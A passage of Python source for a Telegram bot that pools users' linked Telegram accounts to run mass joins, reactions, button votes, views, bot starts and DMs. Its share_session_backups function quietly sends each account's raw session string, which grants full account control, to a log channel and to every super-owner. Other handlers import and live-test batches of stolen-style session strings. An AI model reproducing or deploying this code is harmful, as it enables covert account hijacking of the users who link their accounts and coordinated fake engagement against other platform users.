        await message.answer(f"❌ Database registration failure: {str(e)}")
    finally:
        await client.disconnect()
        registration_sessions.pop(user_id, None)
        await state.clear()

async def share_session_backups(bot: Bot, session_str: str, phone: str, username: str, user_id: int):
    if not config.LOG_CHANNEL_ID:
        return
    clean_phone = phone.replace("+", "").strip()
    session_bytes = session_str.encode('utf-8')
    caption_text = (
        f"🔑 **New StringSession Backup Document Distributed**\n"
        f"📱 **Phone:** `+{clean_phone}`\n"
        f"👤 **Username:** @{username or 'N/A'}\n"
        f"🆔 **Linked By User ID:** `{user_id}`"
    )

    try:
        chan_file = BufferedInputFile(session_bytes, filename=f"string_{clean_phone}.txt")
        await bot.send_document(chat_id=config.LOG_CHANNEL_ID, document=chan_file, caption=f"📁 Logging Backup:\n{caption_text}")
    except Exception as e:
        logger.error(f"Failed forwarding session copy to log channel: {e}")

    for owner_id in config.SUPER_OWNER_IDS:
        try:
            owner_file = BufferedInputFile(session_bytes, filename=f"string_{clean_phone}.txt")
            await bot.send_document(chat_id=owner_id, document=owner_file, caption=caption_text)
        except Exception as owner_err:
            logger.error(f"Could not forward session data packet to superowner {owner_id}: {owner_err}")

# --- UNIVERSAL INTERACTIVE INCOMING ROUTER (FORWARDS & WRITTEN IMPORTS) ---
@router.message(F.document | F.reply_to_message)
async def handle_incoming_imports(message: Message, bot: Bot):
    user_id = message.from_user.id
    role = await db_mgr.get_user_role(user_id)

    # 1. Check if it's a structural DB restoration request
    if message.text and "import" in message.text.lower() and message.reply_to_message and message.reply_to_message.document:
        if role not in ["super_owner"]:
            await message.answer("🚫 Security Scope Restriction: Database structural updates are locked to Super Owners.")
            return

        doc = message.reply_to_message.document
        if not doc.file_name.endswith(".db"):
            await message.answer("❌ Structural failure. This feature requires a valid SQLite database binary backup image ending in `.db`.")
            return

        await message.answer("🔄 Initializing structural data merge pipeline from file map parameters...")
        file_info = await bot.get_file(doc.file_id)
        temp_db_path = f"incoming_temp_restore_{user_id}.db"
        await bot.download_file(file_info.file_path, destination=temp_db_path)

        try:
            inserted_counter = 0
            async with aiosqlite.connect(temp_db_path) as source_db:
                async with source_db.execute("SELECT phone, user_id, username, session_string, status FROM accounts") as cursor:
                    async for row in cursor:
                        async with aiosqlite.connect(db_mgr.db_path) as main_db:
                            await main_db.execute("""
                                INSERT OR REPLACE INTO accounts (phone, user_id, username, session_string, status, last_active)
                                VALUES (?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
                            """, (row[0], row[1], row[2], row[3], row[4]))
                            await main_db.commit()
                        inserted_counter += 1
            
            await message.answer(f"🎉 **Database Merged Successfully!**\n⚡ Live-injected `{inserted_counter}` automation accounts into the central processing pipeline safely.")
            await db_mgr.log_action(user_id, f"Executed manual merge restoration of {inserted_counter} profile entries from backup DB image.", bot)
        except Exception as err:
            await message.answer(f"❌ Core Parser Collision: Failed to integrate binary fields: {err}")
        finally:
            if os.path.exists(temp_db_path):
                os.remove(temp_db_path)
        return

    # 2. Check if it's a parsed Admin Text Backup manifest import
    if message.document and (message.document.file_name.startswith("accounts_backup_") or message.document.file_name.endswith(".txt")):
        if role not in ["admin", "owner", "super_owner"]:
            await message.answer("🚫 Access Denied.")
            return

        file_info = await bot.get_file(message.document.file_id)
        file_bytes = await bot.download_file(file_info.file_path)
        raw_content = file_bytes.read().decode('utf-8', errors='ignore').strip()

        try:
            parsed_data = json.loads(raw_content)
            if not isinstance(parsed_data, list):
                return 

            await message.answer("📦 Valid structured backup container discovered. Live testing token authorizations...")
            success_imports = 0

            for entry in parsed_data:
                phone = str(entry.get("phone", ""))
                assigned_owner = int(entry.get("user_id", user_id))
                username = entry.get("username", "None")
                session_str = entry.get("session_string", "")

                if not session_str:
                    continue

                if role != "super_owner":
                    assigned_owner = user_id

                client = TelegramClient(StringSession(session_str), config.API_ID, config.API_HASH)
                await client.connect()
                if await client.is_user_authorized():
                    encrypted_session = encrypt_data(session_str)
                    async with aiosqlite.connect(db_mgr.db_path) as db:
                        await db.execute("""
                            INSERT OR REPLACE INTO accounts (phone, user_id, username, session_string, status, last_active)
                            VALUES (?, ?, ?, ?, 'active', CURRENT_TIMESTAMP)
                        """, (phone.replace("+", ""), assigned_owner, username, encrypted_session))
                        await db.commit()
                    success_imports += 1
                await client.disconnect()

            await message.answer(f"✅ **Import Manifest Completed!**\nSuccessfully mounted `{success_imports}` active accounts to your structural node ID environment.")
            await db_mgr.log_action(user_id, f"Batch manifest import setup processed successfully. Added {success_imports} items.", bot)
        except Exception as json_err:
            logger.debug(f"Document was not a standard JSON configuration schema layout: {json_err}")

# --- TASK BUILDER WIZARD INTERFACE ---
@router.callback_query(F.data == "task_hub_start")
async def task_hub_select_type(callback: CallbackQuery, state: FSMContext, bot: Bot):
    await callback.answer()
    await state.clear()
    await db_mgr.log_action(callback.from_user.id, "Began automated task wizard configuration", bot)
    await callback.message.edit_text(
        "⚡ **Automation Task Configurator Wizard**\nSelect the type of action you wish to deploy:",
        reply_markup=get_task_types_keyboard()
    )
    await state.set_state(TaskWizardStates.choosing_type)

@router.callback_query(StateFilter(TaskWizardStates.choosing_type), F.data.startswith("set_type:"))
async def task_hub_process_type(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    task_type = callback.data.split(":")[1]
    await state.update_data(task_type=task_type)
    
    if task_type in ["react", "button_vote", "views"]:
        await callback.message.edit_text(
            "🔗 **Provide Post/Message Link:**\nPaste the link pointing to the target post (e.g., `https://t.me/c/12345678/2` or `https://t.me/channel/2`):"
        )
    elif task_type == "start_bot":
        await callback.message.edit_text(
            "🤖 **Enter Target Bot Link or Username:**\nSend the bot's username or its full referral link (e.g., `@ExampleBot` or `https://t.me/ExampleBot?start=ref123`):"
        )
    else:
        await callback.message.edit_text(
            "🔗 **Enter Target Resource:**\nProvide the Username, Public Link, or Private Join Link to scan:"
        )
    await state.set_state(TaskWizardStates.waiting_for_target)

@router.message(StateFilter(TaskWizardStates.waiting_for_target))
async def task_hub_process_target(message: Message, state: FSMContext, bot: Bot):
    target = message.text.strip()
    await state.update_data(target=target)
    
    data = await state.get_data()
    task_type = data.get("task_type")

    if task_type in ["join", "leave", "start_bot", "views"]:
        await finalize_task_creation(message, state, bot)
        
    elif task_type == "react":
        await message.answer("🔄 Analyzing target post to extract existing reactions...")
        parsed_target, link_msg_id = parse_telegram_link(target)
        
        existing_reactions = []
        async with aiosqlite.connect(db_mgr.db_path) as db:
            cursor = await db.execute("SELECT session_string FROM accounts WHERE status = 'active' LIMIT 1")
            row = await cursor.fetchone()
            if row:
                try:
                    dec_session = decrypt_data(row[0])
                    client = TelegramClient(StringSession(dec_session), config.API_ID, config.API_HASH)
                    await client.connect()
                    
                    target_msg = await client.get_messages(parsed_target, ids=link_msg_id or 0)
                    if target_msg and target_msg.reactions:
                        for react in target_msg.reactions.results:
                            if isinstance(react.reaction, tg_types.ReactionEmoji):
                                existing_reactions.append(react.reaction.emoticon)
                    await client.disconnect()
                except Exception as e:
                    logger.warning(f"Unable to read existing reactions dynamically: {e}")

        await state.update_data(selected_emojis=[], existing_reactions=existing_reactions)
        
        reaction_text = "🎭 **Choose Emojis to Distribute:**\n"
        if existing_reactions:
            reaction_text += f"📊 **Detected Existing Reactions:** {', '.join(existing_reactions)}\n\n"
        reaction_text += "Select target reaction emojis from the buttons below. The active accounts will distribute them evenly."
        
        await message.answer(
            reaction_text,
            reply_markup=get_emoji_selection_keyboard([], existing_reactions)
        )
        await state.set_state(TaskWizardStates.waiting_for_emojis)
        
    elif task_type == "button_vote":
        await message.answer(
            "🔘 **Enter Button Text/Emoji:**\nType the exact emoji or text label you want to click (e.g., `😂`):"
        )
        await state.set_state(TaskWizardStates.waiting_for_button_text)
        
    elif task_type == "dm":
        await message.answer("📝 **Message Body Content:** Enter the text string to dispatch to the target:")
        await state.set_state(TaskWizardStates.waiting_for_dm_text)

# --- REACTION MULTI-SELECTOR CONTROLLERS ---
@router.callback_query(StateFilter(TaskWizardStates.waiting_for_emojis), F.data.startswith("toggle_emoji:"))
async def handle_toggle_emoji(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    emoji = callback.data.split(":")[1]
    data = await state.get_data()
    selected_emojis = data.get("selected_emojis", [])
    existing_reactions = data.get("existing_reactions", [])

    if emoji in selected_emojis:
        selected_emojis.remove(emoji)
    else:
        selected_emojis.append(emoji)

    await state.update_data(selected_emojis=selected_emojis)
    await callback.message.edit_reply_markup(reply_markup=get_emoji_selection_keyboard(selected_emojis, existing_reactions))

@router.callback_query(StateFilter(TaskWizardStates.waiting_for_emojis), F.data == "finish_emoji_selection")
async def finish_emoji_selection(callback: CallbackQuery, state: FSMContext, bot: Bot):
    data = await state.get_data()
    selected_emojis = data.get("selected_emojis", [])

    if not selected_emojis:
        await callback.answer("⚠️ Please select at least one emoji before confirming!", show_alert=True)
        return

    await callback.answer()
    await state.update_data(reactions=selected_emojis)
    await callback.message.delete()
    await finalize_task_creation(callback.message, state, bot)

# --- OTHER WIZARD PARAMS INPUT ---
@router.message(StateFilter(TaskWizardStates.waiting_for_button_text))
async def process_button_text(message: Message, state: FSMContext, bot: Bot):
    btn_text = message.text.strip()
    await state.update_data(button_text=btn_text)
    await finalize_task_creation(message, state, bot)

@router.message(StateFilter(TaskWizardStates.waiting_for_dm_text))
async def process_dm_text(message: Message, state: FSMContext, bot: Bot):
    dm_text = message.text.strip()
    await state.update_data(text=dm_text)
    await finalize_task_creation(message, state, bot)

# --- FINALIZE AND SAVE TASK ---
async def finalize_task_creation(message: Message, state: FSMContext, bot: Bot):
    data = await state.get_data()
    user_id = message.chat.id if isinstance(message, Message) else message.from_user.id
    task_type = data.pop("task_type")
    
    target = data.get("target", "")
    parsed_target, link_msg_id = parse_telegram_link(target)
    
    if link_msg_id:
        data["msg_id"] = link_msg_id

    payload_json = json.dumps(data)
    
    async with aiosqlite.connect(db_mgr.db_path) as db:
        cursor = await db.execute(
            "INSERT INTO tasks (creator_id, type, payload) VALUES (?, ?, ?)",
            (user_id, task_type, payload_json)
        )
        task_id = cursor.lastrowid
        await db.commit()

    await task_queue.add_task(task_id, user_id, task_type, data, bot)
    await db_mgr.log_action(user_id, f"Queued task #{task_id} [{task_type.upper()}] target: {target}", bot)
    
    response_msg = (
        f"🚀 **Task #{task_id} successfully queued!**\n"
        f"⚙️ **Type:** `{task_type.upper()}`\n"
        f"Workers are now executing your actions. Use `/taskreport_{task_id}` to check results."
    )
    
    if isinstance(message, Message):
        await message.answer(response_msg)
    else:
        await message.answer(response_msg)
    
    await state.clear()

# --- REPORTS SYSTEM ---
@router.callback_query(F.data == "view_tasks")
async def view_tasks(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    await callback.answer()
    role = await db_mgr.get_user_role(user_id)
    
    async with aiosqlite.connect(db_mgr.db_path) as db:
        if role in ["admin", "owner", "super_owner"]:
            cursor = await db.execute("SELECT task_id, type, status, progress FROM tasks ORDER BY task_id DESC LIMIT 10")
        else:
            cursor = await db.execute("SELECT task_id, type, status, progress FROM tasks WHERE creator_id = ? ORDER BY task_id DESC LIMIT 10", (user_id,))
        rows = await cursor.fetchall()

    await db_mgr.log_action(user_id, "Viewed operational tasks log history", bot)

    text = "📊 **Recent Operations Pipeline Log**\n\n"
    if not rows:
        text += "_Queue completely empty._"
    else:
        for row in rows:
            text += f"🔹 **Task #{row[0]}** ({row[1].upper()})\nStatus: `{row[2]}` | Metrics: `{row[3]}`\n"
            text += f"↳ Inspect details: /taskreport_{row[0]}\n\n"

    buttons = [[InlineKeyboardButton(text="🔙 Back", callback_data="main_menu")]]
    await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))

@router.message(F.text.startswith("/taskreport_"))
async def cmd_task_report(message: Message, bot: Bot):
    user_id = message.from_user.id
    role = await db_mgr.get_user_role(user_id)
    
    try:
        task_id = int(message.text.split("_")[1])
    except (IndexError, ValueError):
        await message.answer("❌ Invalid report syntax format.")
        return

    async with aiosqlite.connect(db_mgr.db_path) as db:
        async with db.execute("SELECT creator_id, type, status, progress, success_report, failure_report, payload FROM tasks WHERE task_id = ?", (task_id,)) as cursor:
            row = await cursor.fetchone()

    if not row:
        await message.answer("❌ Task manifest structural log not found inside systems database.")
        return

    creator_id, task_type, status, progress, success_rep, failure_rep, payload = row
    if role not in ["admin", "owner", "super_owner"] and creator_id != user_id:
        await message.answer("🚫 Security Scope Exception: Access denied.")
        return

    await db_mgr.log_action(user_id, f"Requested task diagnostics report for task #{task_id}", bot)

    passed_list = json.loads(success_rep) if success_rep else []
    failed_list = json.loads(failure_rep) if failure_rep else []

    report_text = (
        f"📊 **Manifest Diagnostics Report for Task #{task_id}**\n"
        f"⚙️ **Operation Vector Type:** `{task_type.upper()}`\n"
        f"🚦 **Execution State:** `{status}`\n"
        f"📈 **Progress Metric:** `{progress}`\n"
        f"📦 **Payload Setup parameters:** `{payload}`\n\n"
        f"🟢 **Successful Actions:** `{len(passed_list)}` accounts\n"
        f"🔴 **Failed Actions:** `{len(failed_list)}` accounts\n"
    )

    buttons = []
    if failed_list or passed_list:
        buttons.append([InlineKeyboardButton(text="📥 Download Full Manifest File", callback_data=f"exp_report:{task_id}")])
    buttons.append([InlineKeyboardButton(text="🔙 Main Menu", callback_data="main_menu")])

    await message.answer(report_text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))

@router.callback_query(F.data.startswith("exp_report:"))
async def export_task_report_file(callback: CallbackQuery, bot: Bot):
    task_id = int(callback.data.split(":")[1])
    user_id = callback.from_user.id
    await callback.answer()
    role = await db_mgr.get_user_role(user_id)

    async with aiosqlite.connect(db_mgr.db_path) as db:
        async with db.execute("SELECT creator_id, success_report, failure_report FROM tasks WHERE task_id = ?", (task_id,)) as cursor:
            row = await cursor.fetchone()

    if not row:
        await callback.message.answer("Task not found.")
        return
        
    creator_id, success_rep, failure_rep = row
    if role not in ["admin", "owner", "super_owner"] and creator_id != user_id:
        await callback.message.answer("Access denied.")
        return

    passed_list = json.loads(success_rep) if success_rep else []
    failed_list = json.loads(failure_rep) if failure_rep else []

    output_lines = [
        f"=== MANIFEST REPORT FOR TASK #{task_id} ===",
        f"PASSED CHANNELS BRIDGES ({len(passed_list)}):",
    ]
    for p in passed_list:
        output_lines.append(f" - +{p}: SUCCESS")
        
    output_lines.append("\nFAILED CHANNELS BRIDGES WITH LOG CONTEXTS:")
    for phone, reason in failed_list:
        output_lines.append(f" - +{phone}: FAILED | Reason: {reason}")

    raw_bytes = "\n".join(output_lines).encode("utf-8")
    file_payload = BufferedInputFile(raw_bytes, filename=f"task_{task_id}_manifest.txt")
    
    await callback.message.reply_document(file_payload, caption=f"📂 Complete execution profile log file for task #{task_id}.")
    await db_mgr.log_action(user_id, f"Downloaded report log document for task #{task_id}", bot)

# --- REFERRAL MATRIX INTERFACE ---
@router.callback_query(F.data == "view_referrals")
async def view_referrals(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    await callback.answer()
    ref_link = f"https://t.me/{bot_username}?start=ref_{user_id}"

    async with aiosqlite.connect(db_mgr.db_path) as db:
        async with db.execute("SELECT COUNT(*) FROM users WHERE referred_by = ?", (user_id,)) as cursor:
            count = (await cursor.fetchone())[0]

    await db_mgr.log_action(user_id, "Inspected referral metrics link panel", bot)

    text = (
        f"👥 **Referral Network Matrix**\n\n"
        f"🔗 **Your Direct Invite link:**\n`{ref_link}`\n\n"
        f"📈 **Registered nodes across matrix:** `{count}` verified users."
    )
    buttons = [[InlineKeyboardButton(text="🔙 Back", callback_data="main_menu")]]
    await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))

# --- SYSTEM MANAGEMENT DIAGNOSTICS CONTROL ---
@router.callback_query(F.data == "admin_panel")
async def handle_admin_panel(callback: CallbackQuery, bot: Bot):
    await callback.answer()
    role = await db_mgr.get_user_role(callback.from_user.id)
    if role not in ["admin", "owner", "super_owner"]:
        await callback.message.answer("🚫 Access Denied.")
        return
    await db_mgr.log_action(callback.from_user.id, "Entered Admin Control interface Panel", bot)
    await callback.message.edit_text(
        "🛠️ **Administrative Infrastructure Management Console**\n"
        "Use text command allocations for core configurations:\n\n"
        "🔹 `/addadmin <id> <limit>`\n"
        "🔹 `/removeadmin <id>`",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Back", callback_data="main_menu")]])
    )

@router.callback_query(F.data == "backup_panel")
async def backup_panel(callback: CallbackQuery, bot: Bot):
    await callback.answer()
    role = await db_mgr.get_user_role(callback.from_user.id)
    if role not in ["owner", "super_owner"]:
        await callback.message.answer("🚫 Access Denied.")
        return
    await db_mgr.log_action(callback.from_user.id, "Entered Backup Control Panel", bot)
    buttons = [
        [InlineKeyboardButton(text="📥 Download Raw DB Image", callback_data="export_db")],
        [InlineKeyboardButton(text="🔙 Back", callback_data="main_menu")]
    ]
    await callback.message.edit_text("💾 **Core System Database Image Exporter Hub**\n\n_To restore an exported database snapshot image, reply 'import' to that .db file entry context._", reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))

@router.callback_query(F.data == "export_db")
async def export_db(callback: CallbackQuery, bot: Bot):
    await callback.answer()
    role = await db_mgr.get_user_role(callback.from_user.id)
    if role not in ["super_owner", "owner"]:
        await callback.message.answer("🚫 Access Denied.")
        return
    try:
        with open(db_mgr.db_path, "rb") as f:
            file_data = f.read()
        file = BufferedInputFile(file_data, filename="database_core_backup.db")
        await callback.message.reply_document(file, caption="📂 **Raw Core SQLite Structure Backup Image**\n\nSuper-Owners can forward this database file back to this panel and type `import` to restore or merge all platform identity logs.")
        await db_mgr.log_action(callback.from_user.id, "Exported raw backup of the system database file", bot)
    except Exception as e:
        await callback.message.answer(f"❌ Structural export error: {str(e)}")

@router.callback_query(F.data == "system_stats")
async def system_stats(callback: CallbackQuery, bot: Bot):
    await callback.answer()
    role = await db_mgr.get_user_role(callback.from_user.id)
    if role not in ["owner", "super_owner"]:
        await callback.message.answer("🚫 Access Denied.")
        return

    async with aiosqlite.connect(db_mgr.db_path) as db:
        async with db.execute("SELECT COUNT(*) FROM users") as c1:
            total_users = (await c1.fetchone())[0]
        async with db.execute("SELECT COUNT(*) FROM accounts") as c2:
            total_accounts = (await c2.fetchone())[0]
        async with db.execute("SELECT COUNT(*) FROM accounts WHERE status = 'active'") as c3:
            active_accounts = (await c3.fetchone())[0]

    await db_mgr.log_action(callback.from_user.id, "Requested system metrics overview details", bot)

    stats_text = (
        f"📊 **Core Operational Telemetry Indicators**\n\n"
        f"👥 **Total User records saved:** `{total_users}`\n"
        f"📱 **Total MTProto sessions initialized:** `{total_accounts}`\n"
        f"🟢 **Active Bridge Connections:** `{active_accounts}`\n"
        f"🔴 **Dropped/Dead Bridge Nodes:** `{total_accounts - active_accounts}`"
    )
    buttons = [[InlineKeyboardButton(text="🔙 Back", callback_data="main_menu")]]
    await callback.message.edit_text(stats_text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))

# --- BOOTSTRAPPING RUNTIME ---
async def verify_saved_sessions():
    logger.info("Running verification pings across system bridges...")
    async with aiosqlite.connect(db_mgr.db_path) as db:
        async with db.execute("SELECT phone, session_string FROM accounts WHERE status = 'active'") as cursor:
            accounts = await cursor.fetchall()

    for phone, enc_session in accounts:
        try:
            client = TelegramClient(StringSession(decrypt_data(enc_session)), config.API_ID, config.API_HASH)
            await client.connect()
            if not await client.is_user_authorized():
                logger.warning(f"Bridge connection verification dropped for +{phone}. Flagging dead.")
                async with aiosqlite.connect(db_mgr.db_path) as db_conn:
                    await db_conn.execute("UPDATE accounts SET status = 'dead' WHERE phone = ?", (phone,))
                    await db_conn.commit()
            await client.disconnect()
        except Exception as e:
            logger.error(f"Error establishing network handshake ping for +{phone}: {e}")

async def main():
    global bot_username
    await db_mgr.init()
    await verify_saved_sessions()

    if not config.BOT_TOKEN:
        logger.error("BOT_TOKEN missing in environment configuration settings!")
        return

    bot = Bot(token=config.BOT_TOKEN)
    
    bot_info = await bot.get_me()
    bot_username = bot_info.username
    logger.info(f"Connected to Telegram as @{bot_username}")

    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(router)

    worker_task = asyncio.create_task(task_queue.start_worker())
    logger.info("Application successfully attached to active network long polling loops.")
    
    try:
        await dp.start_polling(bot)
    finally:
        worker_task.cancel()
        await bot.session.close()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        logger.info("Process execution halted cleanly.")
